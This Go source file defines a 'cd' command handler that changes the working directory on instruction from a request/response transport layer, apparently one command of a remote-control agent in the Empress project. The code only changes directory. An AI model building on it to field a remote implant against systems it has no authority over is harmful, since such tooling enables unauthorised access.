package fs

import (
	"github.com/pygrum/Empress/transport"
	"os"
)

func CmdCD(req *transport.Request, response *transport.Response) {
	homeDir, err := os.UserHomeDir()
	if len(req.Args) == 0 {
		if err != nil {
			transport.ResponseWithError(response, err)
			return
		}
		req.Args = append(req.Args, []byte(homeDir))
	}
	path := string(req.Args[0])
	if err = os.Chdir(path); err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestNone,
	})
}
